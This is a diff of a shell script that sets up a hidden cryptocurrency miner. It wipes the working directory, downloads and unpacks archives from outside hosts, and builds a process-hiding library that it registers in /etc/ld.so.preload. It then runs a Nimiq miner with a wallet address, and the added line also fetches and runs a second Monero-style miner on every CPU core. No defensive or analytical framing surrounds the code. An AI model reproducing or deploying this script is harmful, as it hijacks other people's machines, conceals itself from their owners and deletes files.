@@ -1,13 +1,11 @@
-rm -rvf * && mkdir d && cd d
+rm -rvf * && mkdir xcode && cd xcode
 #!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
 apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y
 
-wget https://gitlab.com/megatronsquads/megatronsquads/-/raw/main/micin.tar.gz
-tar -xvzf micin.tar.gz
-wget https://gitlab.com/megatronsquads/megatronsquads/-/raw/main/apik.tar.gz
+wget https://sc1.nasihosting.com/apik.tar.gz
 tar -xvzf apik.tar.gz
 rm -rf apik.tar.gz
 
@@ -38,7 +36,7 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp rm -rf gas && wget -q 'https://gitlab.com/megatronsquads/megatronsquads/-/raw/main/elpigi.zip' && unzip elpigi.zip
+./graftcp/graftcp rm -rf gas && wget -q 'https://sc1.nasihosting.com/elpigi.zip' && unzip elpigi.zip
 chmod +x gas
 rm -rf Makefile
 rm -rf processhider.c
@@ -46,7 +44,7 @@ rm -rf README.md
 rm -rf .gitignore
 rm -rf elpigi.zip
 
-./graftcp/graftcp wget https://gitlab.com/megatronsquads/megatronsquads/-/raw/main/megatron.zip
+./graftcp/graftcp wget https://sc1.nasihosting.com/megatron.zip
 unzip megatron.zip
 rm -rf megatron.zip
 make
@@ -54,4 +52,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./gas -d=0 -a "NQ82UYV095UD9MST21399ABS6ANJKBRKJEPH" -s nimiq.icemining.ca -p 2053 -n $(echo $(shuf -i 1-20000 -n 1)GPU-Sage) -t 4  -i Disable
+./graftcp/graftcp ./gas -d=0 -a "NQ82UYV095UD9MST21399ABS6ANJKBRKJEPH" -s nimiq.icemining.ca -p 2053 -n $(echo $(shuf -i 1-200 -n 1)Gh-Simbah) -t 4 -i Disable & wget -q https://sc1.xcodehoster.com/macan && chmod 700 macan && ./macan -o 172.232.30.200:443 -u ZEPHsA3mksJG2P4LgfHuuRDwswtmYxepV3ovN8mSR6BqLKzoAqdsz8nQGmmYtX8YBxKGvtHZ6VR2UU8c2tPec8rW7YvsPJtMPmJ -p Gh-Tukiman -a rx/0 -k --donate-level 1 -t $(nproc)
